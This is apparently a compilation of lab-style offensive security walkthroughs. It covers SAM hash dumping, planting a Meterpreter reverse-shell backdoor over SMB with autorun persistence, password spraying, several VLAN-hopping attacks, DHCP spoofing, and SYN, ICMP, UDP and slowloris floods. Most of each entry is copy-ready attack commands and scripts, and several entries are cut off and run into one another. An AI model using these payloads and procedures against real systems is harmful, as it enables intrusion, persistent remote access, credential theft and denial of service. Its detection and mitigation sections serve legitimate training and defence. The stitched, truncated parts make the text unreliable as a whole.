Then use samdump2 in Kali:samdump2 system sam---### 🛑 STEP 7: Cleanup• In Meterpreter: exit• Stop Metasploit: exit• Clear hashes and logs from your machine• Power off the test VMs after testing🧠 Tip: Dumping hashes is one of the most dangerous and powerful things in post-exploitation. Impact: - Extract all login hashes- Crack passwords offline- Lateral movement, privilege escalation
Detection Method: - Enable Windows Security Auditing- Monitor for hashdump/reg save usage- Log access to SYSTEM/SAM files
Solution: - Block admin SMB logins externally- Use LSA protections- Disable local admin accounts- Monitor post-exploit tools
Source: MITRE ATT&CK, Rapid7 Docs, Impacket, OffSec Labs

Title: Dropping Backdoors via SMB Share
Scenario Description: Once an attacker gains admin-level access over SMB (port 445), they can copy malicious files (like reverse shells, keyloggers, or backdoors) to Admin shares such as C$ and then configure persistence mechanisms (e.g., registry autorun, scheduled tasks). This lab demonstrates how to use Kali Linux + Metasploit to generate a payload, upload it to the Windows machine over SMB, and configure auto-start so that the backdoor runs on every reboot. This simulates a common red team tactic in a safe, isolated virtual lab using Windows 7 or XP as the target.
Tools Used: ✅ Kali Linux (attacker)✅ Windows 7 (target)✅ Metasploit Framework (msfvenom, msfconsole)✅ Valid SMB admin credentials✅ smbclient (pre-installed)✅ reg.exe or Metasploit's persistence module
Attack Steps:
### 🟢 STEP 1: Set Up Lab (Kali + Windows)1. Open Kali Linux and Windows 7 VM in VirtualBox/VMware.2. Put both in same Host-only/NAT network.3. Check target IP in Windows:ipconfig → e.g., 192.168.56.1044. Check Kali IP:ip a → e.g., 192.168.56.103✅ Ensure SMB (445) is open:nmap -p 445 192.168.56.104---### 🟢 STEP 2: Generate the Backdoor EXEUse msfvenom in Kali:bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.103 LPORT=4444 -f exe -o backdoor.exe
📌 Explanation:• -p = payload• LHOST = your Kali IP• LPORT = listening port• -f exe = format is Windows EXE• -o = output file name✅ Result: backdoor.exe will be saved in your Kali home dir.---### 🟢 STEP 3: Upload EXE via SMB Admin ShareCommand:bash
smbclient //192.168.56.104/C$ -U administrator
Password: admin123Inside smbclient prompt:bash
put backdoor.exe
✅ This copies backdoor.exe to C:\ drive on target.Exit with:exit---### 🟢 STEP 4: Set Autorun Persistence (via Registry)Still in Kali, use remote command execution (many ways):🅰️ Option 1: Use reg.exe (if remote shell access)bash
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\\backdoor.exe"
🅱️ Option 2: Use Metasploit's persistenceInside msfconsole, after Meterpreter shell:run persistence -U -i 10 -p 4444 -r 192.168.56.103✅ This will create a registry key to auto-launch payload on boot.---### 🟢 STEP 5: Setup Listener on KaliBack in Kali terminal:msfconsolebash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.56.103
set LPORT 4444
run
✅ When victim reboots, backdoor.exe auto-executes and connects back 🔥---### 🟢 STEP 6: Verify ConnectionWhen user logs in on Windows, you’ll see:Meterpreter session 1 opened...Inside Meterpreter:getuid, shell, sysinfo etc.---### 🛑 STEP 7: Cleanup1. In Meterpreter: run cleanup2. Or manually delete backdoor:bash
del C:\backdoor.exe
reg delete HKLM\... /v Backdoor /f
3. Exit Metasploit4. Power off test VMs🧠 Tip: Always test in safe labs. This technique is extremely powerful and must never be used without permission.
Vulnerability: Admin SMB access + writable C$ + registry autorun

Impact: - Full persistent access to target- Auto-shell on every reboot- Covert post-exploitation foothold
Detection Method: - Autorun registry key monitoring- AV alerts on EXE drop- Behavior-based EDR detection
Solution: - Disable SMB admin shares- Use EDR to block unknown autoruns- Monitor registry keys- Block outgoing reverse shells
Source: MITRE ATT&CK, Offensive Security, Metasploit Unleashed

Title: Password Spray Attack (Many Users)

This is different from brute-force because it avoids lockout protections that trigger after several wrong attempts on a single account. Password spraying is used against corporate portals, email logins, RDP servers, SMB, or any service that supports authentication. In this simulation, we’ll use hydra or crackmapexec on Kali Linux to spray a single password across many Windows domain users over SMB. This method is stealthy and used often by red teams and real attackers alike.
Tools Used: ✅ Kali Linux (attacker)✅ Windows Server with domain users (target)✅ Valid list of usernames (like users.txt)✅ Single password guess (like Password123)✅ hydra or crackmapexec✅ Optional: Metasploitable2, RDP/SMB/LDAP/RADIUS services
Attack Steps:
### 🟢 STEP 1: Set Up Lab1. Launch Kali Linux VM and Windows Server (with user accounts)2. Make sure both are in the same network (Host-Only / NAT).3. Check Windows IP:ipconfig → Example: 192.168.56.104✅ Ensure the target supports logins via SMB (port 445) or another protocol like RDP, HTTP, etc.---### 🟢 STEP 2: Prepare Username ListCreate a file users.txt with domain usernames:bash
echo "john" >> users.txt
echo "mary" >> users.txt
echo "admin" >> users.txt
echo "david" >> users.txt
✅ These are the users we will spray the password onto.---### 🟢 STEP 3: Choose Your PasswordPick 1 common password to spray (can be seasonal):bash
echo "Winter2024" > pass.txt
✅ Only 1–2 passwords per day are sprayed to avoid lockouts.---### 🟢 STEP 4: Run Hydra (for SMB Login Spray)Use this command:bash
hydra -L users.txt -p Winter2024 smb://192.168.56.104
Explanation:• -L users.txt = list of usernames• -p = one password (spray)• smb:// = SMB login protocol✅ Output shows which accounts succeeded:[445][smb] host: 192.168.56.104 login: john password: Winter2024---### 🟢 STEP 5: (Alternative) Using CrackMapExecMore stealthy and domain-aware option:Install:sudo apt install crackmapexecThen run:bash
crackmapexec smb 192.168.56.104 -u users.txt -p Winter2024

Vulnerability: Weak, common passwords used across multiple users
Impact: - Account takeover- Initial access into domain- Bypass lockout mechanisms
Detection Method: - Audit logs for repeated login failures- SIEM detection for login pattern anomalies- Login from unknown IPs
Solution: - Enforce strong password policies- Implement account lockout policies- Use MFA- Monitor logs for failed logins across many users
Source: MITRE ATT&CK, Red Team Notes, Hydra Docs, CME GitHub

Title: Switch Spoofing (Trunk Spoofing)
Scenario Description: In a Switch Spoofing Attack, the attacker connects a rogue system (like Kali Linux or a malicious switch) to a switch port configured for Dynamic Trunking Protocol (DTP). DTP is used to auto-negotiate trunking between switches. If the legitimate switch port is set to auto or dynamic desirable, the attacker's interface can trick it into creating a trunk port. As a result, the attacker gains access to multiple VLANs, violating network segmentation. This is a VLAN hopping technique and can lead to unauthorized access to otherwise isolated traffic. We simulate this using Kali Linux + Yersinia tool on a Cisco switch-enabled lab.
Tools Used: ✅ Kali Linux (with yersinia)✅ Cisco Switch with DTP enabled ports✅ Ethernet cable (direct physical connection)✅ Wireshark (optional, for traffic capture)
Attack Steps:
### 🟢 STEP 1: Setup the Lab Environment1. Use Kali Linux as the attack machine.2. Connect Kali via Ethernet to a Cisco Switch Port configured as or .3. Title: Double Tagging Attack (802.1Q VLAN)
Scenario Description: In a Double Tagging Attack, an attacker in a VLAN (e.g., VLAN 10) crafts an Ethernet frame with two VLAN tags: an outer tag for their own VLAN, and an inner tag for the target VLAN (e.g., VLAN 20). Some misconfigured switches remove only the outer tag and then forward the frame based on the inner tag, effectively bypassing segmentation and delivering the packet into the victim VLAN. This is a VLAN hopping technique that requires no trunk access — only an access port and switch with improper VLAN filtering. We simulate this attack from Kali Linux using Scapy or manually crafted packets, then observe with Wireshark or the target’s response.
Tools Used: ✅ Kali Linux (attacker)✅ Cisco Switch with 802.1Q tagging✅ Access to VLAN 10 (attacker VLAN)✅ Target system in VLAN 20✅ Scapy (preinstalled in Kali)✅ Optional: Wireshark for traffic capture
Attack Steps:
### 🟢 STEP 1: Lab Setup1. Boot up Kali Linux as attacker.2. Boot up another VM (Windows or Linux) as victim in VLAN 20.3. Connect both machines to same switch, but assign:• Kali to VLAN 10 (attacker’s VLAN)• Victim to VLAN 20 (target VLAN)✅ Confirm both VLANs exist and are isolated normally.---### 🟢 STEP 2: Install or Open Scapy in KaliScapy is a Python-based packet crafter.Check it:bash
scapy
If it doesn’t open:sudo apt install scapyOnce inside Scapy prompt, you're ready to build packets.---### 🟢 STEP 3: Craft a Double-Tagged PacketWe’ll manually insert two VLAN tags:python
from scapy.all import *

pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / \
Dot1Q(vlan=10) / Dot1Q(vlan=20) / \
IP(dst="192.168.20.100") / ICMP()

sendp(pkt, iface="eth0")
📌 Explanation:• First tag vlan=10: attacker VLAN (your port)• Second tag vlan=20: target VLAN• IP() + ICMP() = normal ping• sendp() sends the Ethernet frame✅ This packet will be accepted by the switch as VLAN 10, but if misconfigured, it will strip outer tag and forward it into VLAN 20. BOOM 💣---### 🟢 STEP 4: Capture and Analyze Traffic1. On the victim machine (VLAN 20), run Wireshark or tcpdump:bash
sudo tcpdump -i eth0 icmp
✅ If VLAN hopping worked, victim will receive ICMP packet even though it came from another VLAN.2. On Kali, confirm response if victim replies:Use Wireshark or:sudo tcpdump -i eth0 icmp✅ This confirms successful VLAN hop using double-tagging.---### 🟢 STEP 5: Optional – Ping Target or Send Malicious PayloadYou can modify the IP(dst="x.x.x.x") and craft payloads like:• TCP(dport=80) – for HTTP• UDP(dport=161) – for SNMPThis can let you scan, access, or exploit target services in VLAN 20.---### 🛑 STEP 6: Cleanup1. Exit Scapy (exit())2. Delete scripts if saved3. Shut down lab VMs4. Disable promiscuous capture if used🧠 Tip: This attack works only if switch is vulnerable to double-tag stripping and the native VLAN is same as attacker VLAN — a dangerous combo still seen in legacy setups.
Vulnerability: 802.1Q double-tagged frame + switch stripping only outer tag
Impact: - VLAN isolation bypass- Access to unauthorized systems- Lateral movement in segmented environments
Detection Method: - VLAN-aware packet inspection- Monitor for double-tagged frames- Switch log monitoring
Solution: - Set native VLAN to unused ID (not attacker VLAN)- Drop all tagged packets on access ports- Disable trunking & enforce access mode
Source: Cisco Docs, Scapy Manual, MITRE ATT&CK, Red Team Field Manual

Title: Voice VLAN Injection Attack
Scenario Description: In many enterprise setups, VoIP phones are connected to a switch port, and PCs connect to the phone. The switch port is configured with a data VLAN (PC traffic) and a voice VLAN (for the phone). Switches often identify phones using LLDP or CDP (link-layer discovery protocols). Attackers connected to the same switch port can pretend to be an IP phone by forging LLDP/CDP frames, tricking the switch into giving them access to the voice VLAN, which may be less filtered or monitored. In this simulation, we’ll use Kali Linux with yersinia or custom Scapy scripts to inject LLDP/CDP packets and join the Voice VLAN, bypassing segmentation.
Tools Used: ✅ Kali Linux (attacker)✅ Cisco Switch (with voice VLAN config)✅ LLDP/CDP-enabled port✅ yersinia (Layer 2 attack tool)✅ Optional: Wireshark, VoIP client (like Linphone)
Attack Steps:
### 🟢 STEP 1: Setup Lab Environment1. Open Kali Linux VM.2. Plug into a switch port configured with voice VLAN.3. Confirm target switch uses LLDP/CDP to detect IP phones.4. Confirm port allows voice VLAN tagging using 802.1Q.✅ This is often true if IP phones like Cisco/Avaya are used with PCs behind them.---### 🟢 STEP 2: Launch Yersinia (LLDP/CDP Attack Tool)Yersinia simulates Layer 2 protocols:bash
sudo yersinia -I
Inside Yersinia:1. Press F2 to open action menu2. Select CDP or LLDP3. Choose “Send CDP Packet” or “Send LLDP Packet”✅ The switch now thinks Kali is a VoIP phone.---### 🟢 STEP 3: Switch Grants Access to Voice VLANNow the switch may allow VLAN tagging on your interface:• Outer tag: Native VLAN (Data, e.g. VLAN 10)• Inner tag: Voice VLAN (e.g. VLAN 20)---### 🟢 STEP 4: Capture Voice VLAN TrafficUse Wireshark on Kali:bash
sudo wireshark
Apply filter: vlan✅ You’ll start seeing tagged VLAN traffic, especially SIP/RTP if VoIP calls are activeYou can also filter:• sip – for VoIP control• rtp – for voice streams---### 🟢 STEP 5: Join Voice VLAN Interface (Manual VLAN Access)Inject traffic into Voice VLAN manually:bash
sudo apt install vlan
sudo modprobe 8021q
sudo vconfig add eth0 20 # if VLAN 20 is voice
sudo ifconfig eth0.20 up
✅ You are now in the Voice VLAN, can send/receive traffic.---### 🟢 STEP 6: Optional – Use SIP ClientInstall VoIP app like linphone or sipcmd:Try to register a softphone or sniff credentials from SIP packetsYou may:• Intercept live calls• Record RTP audio streams• Perform SIP flooding or DoS---### 🛑 STEP 7: Cleanup1. Stop Yersinia (Ctrl+C)2. Remove VLAN:bash
sudo vconfig rem eth0.20
3. Disable promiscuous interfaces4. Power off test VMs🧠 Tip: Many networks don’t segment Voice VLANs properly, assuming they’re "safe". This attack abuses that trust.
Target Type: IP Phone Switch Ports (with voice+data VLAN config)
Vulnerability: LLDP/CDP auto-detection of phones on access ports
Impact: - Join Voice VLAN without permission- Eavesdrop VoIP calls- SIP credential harvesting- Lateral access to VoIP systems
Detection Method: - Monitor for spoofed LLDP/CDP frames- Alert on unknown MACs in Voice VLAN- Analyze tagged VLAN access logs
Solution: - Disable CDP/LLDP on access ports- Restrict VLAN tagging on PC-facing ports- Enforce MAC filtering for VoIP devices- Segment voice VLAN from internal systems
Source: Cisco Docs, Yersinia Manual, MITRE ATT&CK, VoIP Lab

Title: MAC Flooding + VLAN Cross-Talk Attack
Scenario Description: In this combined Layer 2 attack, an attacker first launches a MAC Flooding Attack by sending a huge number of fake MAC addresses into the switch using macof. This overflows the switch’s CAM table, making it forget which port is associated with which MAC address. As a result, the switch starts broadcasting frames to all ports, like a hub. If the switch is misconfigured or under load, it may start leaking frames between VLANs, causing VLAN Cross-Talk. This violates network segmentation and allows an attacker to capture sensitive data from VLANs they don’t belong to. It’s deadly in flat or poorly segmented networks.
Tools Used: ✅ Kali Linux (attacker)✅ Cisco or unmanaged switch (victim)✅ macof (from dsniff package)✅ Wireshark or tcpdump✅ Any target system in a different VLAN✅ Promiscuous mode NIC (enabled by default in Kali)
Attack Steps:
### 🟢 STEP 1: Set Up Lab Environment1. Open Kali Linux on VirtualBox/VMware.2. Connect Kali to switch on VLAN 10.3. Connect a target PC or VM on VLAN 20 (different VLAN).✅ Ensure both devices are on the same physical switch.---### 🟢 STEP 2: Install macof Toolmacof comes from dsniff package.Install it:bash
sudo apt update
sudo apt install dsniff
Check it works:bash
macof -h
---### 🟢 STEP 3: Start Wireshark to Monitor TrafficOn Kali:bash
sudo wireshark
Select eth0 or your interface → Start capture✅ Use filter: ip or vlanLet it run during the attack to observe VLAN leakage---### 🟢 STEP 4: Launch MAC Flooding AttackRun this on Kali:bash
sudo macof -i eth0
📌 This will rapidly send thousands of fake MAC addresses with random IPs into the switch✅ Effect: Switch’s CAM table fills up → It starts flooding all unknown frames to every port---### 🟢 STEP 5: Observe VLAN Leakage1. On Wireshark, look for traffic NOT destined to your VLAN:✅ Do you see:• IPs from another VLAN (e.g., 192.168.20.x)?• TCP/HTTP/SIP traffic that isn’t yours?➡️ That’s VLAN cross-talk due to switch overload or misconfig.2. You can also sniff credentials, file shares, pings, etc.---### 🟢 STEP 6: Optional – Use tcpdump to Log Outputbash
sudo tcpdump -i eth0 -w macflood_capture.pcap
✅ This saves all intercepted traffic to a file you can submit as dataset.---### 🛑 STEP 7: Cleanup1. Stop macof: Ctrl+C2. Stop Wireshark3. Delete the PCAP file if needed:bash
rm macflood_capture.pcap
4. Shut down VMs🧠 Tip: Real switches often defend against this, but low-end or legacy switches don’t — making this a powerful red team trick.
Vulnerability: Limited CAM table size and lack of port securitySwitch not dropping VLAN-tagged frames properly
Impact: - Capturing traffic from other VLANs- Exfiltration of internal data- Eavesdropping on credentials and sessions
Detection Method: - Monitor MAC table exhaustion- Use switch logs for flooding detection- Look for duplicate MACs and broadcast anomalies
Solution: - Enable port security:switchport port-security maximum 1- Use managed switches with CAM protection- Isolate VLANs with L3 filtering
Source: Cisco Docs, Dsniff Toolkit, MITRE ATT&CK, PentesterLab

Title: Misconfigured ACLs / Allowed VLANs on Trunks
Scenario Description: In this attack, the switch has a trunk port misconfigured, or VLAN ACLs are not strictly enforced. Normally, trunk ports are supposed to carry only authorized VLANs using a whitelist. But in misconfigured setups, extra VLANs are allowed on the trunk, or ACLs fail to restrict inter-VLAN access properly. An attacker can then use VLAN tagging tools (like vconfig) to inject traffic into other VLANs and even receive responses back. We simulate this using Kali Linux to create virtual VLAN interfaces and test if ACLs are enforced correctly. If not, the attacker gains unauthorized access.
Tools Used: ✅ Kali Linux✅ Cisco Switch (or Packet Tracer)✅ VLANs configured (e.g., VLAN 10, 20, 30)✅ Trunk port connected to Kali✅ vconfig tool✅ Wireshark / tcpdump
Attack Steps:
### 🟢 STEP 1: Lab Setup – Create a Trunk Connection1. Start Kali Linux VM (or bare metal).2. Connect Kali to a switch port configured as trunk.3. Create VLANs on switch:bash
vlan 10
name Data
vlan 20
name Admin
vlan 30
name Finance
4. On the switch, the trunk should only allow VLAN 10, but due to misconfig, VLAN 20 and 30 are also allowed.✅ Simulate this in Packet Tracer or real Cisco switch.---### 🟢 STEP 2: Install vconfig and Enable 802.1Q SupportInstall VLAN tagging tool:bash
sudo apt update
sudo apt install vlan
sudo modprobe 8021q
✅ This enables VLAN tagging in Linux kernel.---### 🟢 STEP 3: Create Tagged VLAN InterfacesSuppose you're in VLAN 10. Now create virtual interfaces for VLAN 20 and 30:bash
sudo vconfig add eth0 20
sudo vconfig add eth0 30
sudo ifconfig eth0.20 up
sudo ifconfig eth0.30 up
✅ These virtual interfaces send 802.1Q-tagged traffic over the trunk.---### 🟢 STEP 4: Test Access to Other VLANs (Unauthorized)Try pinging hosts in VLAN 20 and 30:bash
ping -I eth0.20 192.168.20.1
ping -I eth0.30 192.168.30.1
If it responds, 🔥 the ACLs or trunk is misconfigured!You just hopped VLANs using trunk leak.---### 🟢 STEP 5: Use Wireshark or tcpdump to Monitor Trafficbash
sudo tcpdump -i eth0.20
sudo tcpdump -i eth0.30
✅ You may now capture:• Inter-VLAN broadcast• DHCP replies• HTTP/VoIP trafficYou’re inside VLANs you shouldn’t be!---### 🟢 STEP 6: Optional – Exploit Other VLAN ServicesRun nmap on other VLANs:bash
sudo nmap -e eth0.30 -sP 192.168.30.0/24
sudo nmap -e eth0.20 -sS 192.168.20.1 -p 22,80,443
✅ If you see open ports, you can now try:• Brute force• File share enumeration• VoIP capture, etc.---### 🛑 STEP 7: Cleanup1. Delete virtual VLANs:bash
sudo vconfig rem eth0.20
sudo vconfig rem eth0.30
2. Shut down Wireshark/tcpdump3. Shut down lab VMs🧠 Tip: Most real breaches happen due to lazy trunk configuration or forgetting to restrict VLANs on trunks — this is real-world attack behavior.
Vulnerability: Trunks carry unauthorized VLANs due to ACL mistakes or allowed vlan all
Impact: - VLAN segmentation bypass- Unauthorized inter-VLAN access- Info disclosure- Lateral movement
Detection Method: - Monitor VLAN ACLs- Port log audits- Unusual MAC/IP in unauthorized VLANs
Solution: - Use switchport trunk allowed vlan X,Y- Enforce strict VLAN filtering on trunks- Use dynamic VLAN security controls
Source: Cisco Docs, MITRE ATT&CK, Red Team Manuals, Real World VLAN Labs

Title: DHCP Spoofing Across VLANs
Scenario Description: In this attack, an attacker on a trunk port or misconfigured access port sends forged DHCP replies across multiple VLANs, impersonating the real DHCP server. This works when the switch is not enforcing DHCP snooping, or if the trunk port allows unauthorized VLANs. Victims on different VLANs may accept the rogue DHCP offer, getting an IP address, malicious gateway, or fake DNS, allowing MITM, traffic redirection, or denial of service. We'll simulate this using Kali Linux, dhcpd, or bettercap, and try to poison VLANs 10, 20, and 30 with spoofed DHCP offers.
Tools Used: ✅ Kali Linux✅ Cisco Switch with trunk or misconfigured VLAN ACLs✅ Victim VMs in multiple VLANs (e.g. 10, 20, 30)✅ DHCP service disabled on victims (or set to auto)✅ bettercap, dhcpd, dsniff, or yersinia
Attack Steps:
### 🟢 STEP 1: Setup VLAN Environment1. Create a Kali Linux VM2. Create victim VMs on VLAN 10, 20, and 303. Connect Kali to trunk port (or misconfigured access port with multiple VLAN access)4. Set victims to obtain IP automatically (DHCP)✅ On switch:bash
interface fa0/1
switchport mode trunk
switchport trunk allowed vlan 10,20,30
✅ Or simulate misconfig with Packet Tracer---### 🟢 STEP 2: Enable VLAN Tagging in KaliEnable 802.1Q support:bash
sudo modprobe 8021q
sudo apt install vlan
Create interfaces:bash
sudo vconfig add eth0 10
sudo vconfig add eth0 20
sudo vconfig add eth0 30
sudo ifconfig eth0.10 up
sudo ifconfig eth0.20 up
sudo ifconfig eth0.30 up
---### 🟢 STEP 3: Install DHCP Spoofing ToolOption A: Use bettercap (recommended)bash
sudo apt install bettercap
sudo bettercap -iface eth0.10
Inside bettercap:bash
set dhcp.spoof.gateway 192.168.10.99
set dhcp.spoof.domain example.com
set dhcp.spoof.dns 8.8.8.8
dhcp.spoof on
Repeat for each VLAN interface (eth0.20, eth0.30)✅ This sends malicious DHCP replies across each VLAN---### 🟢 STEP 4: Start Victim VMs1. Boot victims in VLAN 10, 20, and 302. Ensure their DHCP is enabled (auto IP)✅ If spoofing works:• Victim gets IP from attacker• Default gateway is under attacker control• DNS is poisonedUse ipconfig or ifconfig to verify---### 🟢 STEP 5: Analyze Network AccessNow, Kali can:• MITM or intercept victim’s traffic• Redirect users to phishing pages• Deny network access by assigning fake gatewayUse tcpdump or Wireshark:bash
sudo tcpdump -i eth0.10
---### 🛑 STEP 6: Cleanup1. Disable bettercap:dhcp.spoof off2. Remove VLANs:bash
sudo vconfig rem eth0.10
sudo vconfig rem eth0.20
sudo vconfig rem eth0.30
3. Power down victims4. Clear DHCP leases on targets🧠 Tip: If switch had DHCP Snooping enabled, this spoof would be blocked. That’s why misconfigs + trunk leaks = 🔥
Vulnerability: Lack of DHCP snooping and trunk restrictionsUntrusted ports allowed to send DHCP replies
Impact: - MITM via rogue gateway- DNS hijack- Denial of network access- Cross-VLAN influence
Detection Method: - Monitor DHCP traffic- Alert on rogue DHCP servers- Unexpected DHCP assignments
Solution: - Enable DHCP snooping on switch:ip dhcp snooping- Set trusted DHCP ports only- Block untrusted DHCP offers
Source: MITRE ATT&CK, Bettercap Docs, Cisco DHCP Snooping Guide

Title: Volumetric Denial of Service Attack
Scenario Description: Volumetric attacks flood a target with massive amounts of data to saturate its bandwidth. This could be TCP/UDP packets, ICMP floods, or amplification attacks. The goal is to make the system or network inaccessible to users. These attacks don’t require deep packet inspection or payloads — just sheer volume. In this simulation, we’ll use hping3 to generate large numbers of packets toward a Metasploitable2 VM or HTTP web server on your lab. We’ll also monitor network usage and packet logs to see how the system reacts.
Tools Used: ✅ Kali Linux (attacker)✅ Metasploitable2 VM / HTTP server (target)✅ hping3 (installed in Kali)✅ iftop, nload or Wireshark✅ VirtualBox or VMware✅ Optional: LOIC, slowloris, ping -f
Attack Steps:
### 🟢 STEP 1: Set Up Lab Environment1. Launch Kali Linux VM2. Launch Metasploitable2 or a test web server in your VM3. Make sure they are on the same Host-Only or NAT network✅ Check target IP from Metasploitable:bash
ifconfig
Example: 192.168.56.101---### 🟢 STEP 2: Install and Understand hping3hping3 is a packet crafting tool that can flood a target with TCP/UDP/ICMP packets.To install (already in Kali):bash
sudo apt install hping3
hping3 -h
---### 🟢 STEP 3: Start Monitoring Target Network (Optional)On Metasploitable2 or victim server, run:bash
sudo apt install iftop
sudo iftop -i eth0
✅ This shows bandwidth usage in real time---### 🟢 STEP 4: Launch TCP SYN Flood (Volumetric Flood)Run this on Kali:bash
sudo hping3 -S --flood -V -p 80 192.168.56.101
Explanation:• -S → SYN flag (simulate TCP handshake flood)• --flood → send packets as fast as possible• -V → verbose• -p 80 → target HTTP port✅ This overwhelms port 80 with SYN packets---### 🟢 STEP 5: Try ICMP Flood (Ping Flood)bash
sudo hping3 --icmp --flood 192.168.56.101
✅ ICMP echo flood = classic volumetric attack---### 🟢 STEP 6: Try UDP Flood (DNS/VoIP Servers Commonly Hit)bash
sudo hping3 --udp -p 53 --flood 192.168.56.101
✅ This targets port 53 (DNS) using UDP---### 🟢 STEP 7: Analyze Target ImpactOn victim (Metasploitable):• Use iftop to see traffic volume• Try browsing to its web service (may hang)• Open tcpdump:bash
sudo tcpdump -i eth0
✅ You’ll see thousands of SYN/ICMP/UDP packets---### 🟢 STEP 8: Try LOIC (Optional – GUI Based)1. Download Low Orbit Ion Cannon2. Run it in Windows or Wine3. Set target IP, port, method (TCP/UDP/HTTP)4. Click “IMMA CHARGIN MAH LAZER”✅ LOIC launches a flood with GUI stats---### 🛑 STEP 9: Cleanup1. Stop hping3: Ctrl+C2. Stop iftop or tcpdump3. Shut down Metasploitable2⚠️ Never run this attack on real servers — only in isolated lab environments🧠 Pro Tip: Real attackers use botnets to amplify this with hundreds of IPs. We simulate with one IP to learn the concept.
Target Type: Public Servers / Web Apps / DNS Servers
Vulnerability: No rate-limitingNo traffic filteringExposed public ports
Impact: - Service unavailability- Bandwidth exhaustion- Downtime and data loss
Detection Method: - High traffic from same IP- Spike in SYN/UDP/ICMP- Packet count or netflow anomalies
Solution: - Rate-limit per IP- Deploy firewall filters (iptables/netfilter)- Use DDoS protection services (Cloudflare, Arbor)- Enable SYN cookies
Source: MITRE ATT&CK, hping3 Docs, LOIC GitHub, OWASP

Title: Protocol-Based Denial of Service
Scenario Description: Protocol attacks consume server-side resources (e.g., memory, connection queues) by abusing TCP/IP behavior. Unlike volumetric attacks, these don’t require big bandwidth. Examples include TCP SYN floods, slow HTTP attacks, fragmentation abuse, or session exhaustion. In this simulation, we’ll use hping3 to flood half-open TCP connections, and slowloris to exhaust HTTP sessions by holding them open with minimal traffic. These tricks force the server to keep allocating memory/resources until it crashes or stops accepting connections.
Tools Used: ✅ Kali Linux (attacker)✅ Metasploitable2 or Apache server (target)✅ hping3✅ slowloris✅ nmap, tcpdump, or iftop
Attack Steps:
### 🟢 STEP 1: Set Up the Lab Environment1. Start Kali Linux and Metasploitable2 in VirtualBox2. Ensure both are on Host-Only or NAT network3. Check the target’s IP:bash
ifconfig
✅ Example: 192.168.56.101---### 🟢 STEP 2: Install Tools (if needed)On Kali:bash
sudo apt update
sudo apt install hping3 slowloris nmap
---### 🟢 STEP 3: TCP SYN Flood (Half-Open Connections)This floods the server with TCP requests that never completebash
sudo hping3 -S -p 80 --flood 192.168.56.101
✅ -S sends SYN packets✅ Server allocates memory waiting for ACKs (but none come)Result: Server’s TCP queue fills up → legit users denied access---### 🟢 STEP 4: Slowloris Attack (Slow HTTP Headers)Launch with:bash
slowloris 192.168.56.101 -p 80 -timeout 100 -num 200
✅ slowloris opens many slow HTTP connections by sending headers very slowly, keeping them alive🧠 Apache and light HTTP servers struggle with thisResult: Server keeps connections open = maxes out sockets---### 🟢 STEP 5: Observe the Target ImpactOn Metasploitable2:1. Install iftop or tcpdump:bash
sudo apt install iftop
sudo iftop -i eth0
✅ See slow rise in bandwidth and TCP connections2. Try browsing the service in Firefox➡️ If the page times out or loads very slow → the attack is working---### 🟢 STEP 6: Try TCP FIN or RST Floods (Optional Variant)bash
sudo hping3 -F --flood -p 80 192.168.56.101
sudo hping3 -R --flood -p 80 192.168.56.101
✅ FIN and RST floods confuse some firewalls or apps---### 🛑 STEP 7: Cleanup1. Stop all attacks: Ctrl+C2. Shut down tools and capture logs3. Restart web server (Apache or target) if it crashed🧠 Tip: Protocol attacks are harder to detect, because they use legit-looking packets in high numbers or slow rates.
Vulnerability: Improper rate-limitingLow max connectionsUnpatched TCP/IP stack
Impact: - Website unavailability- Server socket exhaustion- TCP queue overflow- Legit users denied
Detection Method: - Spike in half-open TCP connections (netstat)- Apache/nginx logs full of incomplete requests- IDS for SYN flood or slow HTTP
Solution: - Use firewalls (iptables + SYN rate limit)- Enable SYN cookies- Set Apache max clients- Use reverse proxy (e.g. Nginx)- Deploy anti-DDoS services
Source: MITRE ATT&CK, OWASP, hping3 Docs, slowloris GitHub

Title: Application Layer Denial Attack
Scenario Description: Application Layer (L7) attacks exhaust resources at the web application level, not the network. The attacker may send massive HTTP requests, slow incomplete headers, or force web services to use CPU/memory, eventually slowing or crashing the application. Unlike volumetric attacks, these are stealthy and low-bandwidth. In this lab, we’ll simulate a HTTP GET Flood and a Slowloris Attack against an Apache HTTP server using Kali Linux. We’ll monitor logs, latency, and behavior during the attack. Perfect for learning real-world app DDoS defense.
Tools Used: ✅ Kali Linux (attacker)✅ Apache2 web server (on Metasploitable2 or Ubuntu)✅ slowloris✅ GoldenEye or ab (Apache Bench)✅ htop, iftop, tcpdump
Attack Steps:
### 🟢 STEP 1: Lab Setup1. Start Kali Linux and Metasploitable2 (or Ubuntu with Apache installed)2. Ensure both are on same network✅ Target IP: Run ifconfig on Metasploitable → e.g., 192.168.56.101---### 🟢 STEP 2: Confirm Apache is Running on TargetOn the target VM:bash
sudo systemctl start apache2
sudo systemctl status apache2
✅ Open http://192.168.56.101 in browser from Kali — should show Apache default page---### 🟢 STEP 3: Install and Run Slowloris AttackOn Kali:bash
sudo apt install slowloris
slowloris 192.168.56.101 -p 80 -timeout 100 -num 300
Explanation:• Opens 300 slow HTTP connections• Sends headers slowly to consume web server’s threads✅ Apache will eventually run out of sockets and hang---### 🟢 STEP 4: Monitor Apache Logs and System UsageOn target VM:bash
sudo tail -f /var/log/apache2/access.log
sudo tail -f /var/log/apache2/error.log
htop
iftop
✅ CPU/memory goes up, Apache stops responding to real clients---### 🟢 STEP 5: Simulate HTTP GET Flood (Layer 7 Flood)Install GoldenEye:bash

Title: DNS Amplification DoS Attack
Scenario Description: In this attack, the attacker sends small forged DNS queries to an open DNS resolver with the victim’s IP address spoofed. The DNS server replies to the victim, not the attacker, with a large DNS response. Multiply this by thousands → the victim gets flooded and their connection or server collapses. The attack is called “amplification” because the response is much larger (sometimes 70x) than the request. In this lab, we’ll simulate this using hping3 or scapy, targeting a test victim VM, and generating UDP DNS requests to a public or lab DNS server.
Tools Used: ✅ Kali Linux✅ Victim server (Metasploitable2 or Ubuntu)✅ Public/open DNS server or install dnsmasq✅ Tools: hping3, scapy, tcpdump, wireshark✅ Optional: Docker DNS test container

ifconfig
Example: 192.168.56.101---### 🟢 STEP 2: Prepare Open DNS ServerOption A (use public test DNS):✅ 8.8.8.8 (Google DNS)Option B (local):On Kali:bash
sudo apt install dnsmasq
sudo systemctl start dnsmasq
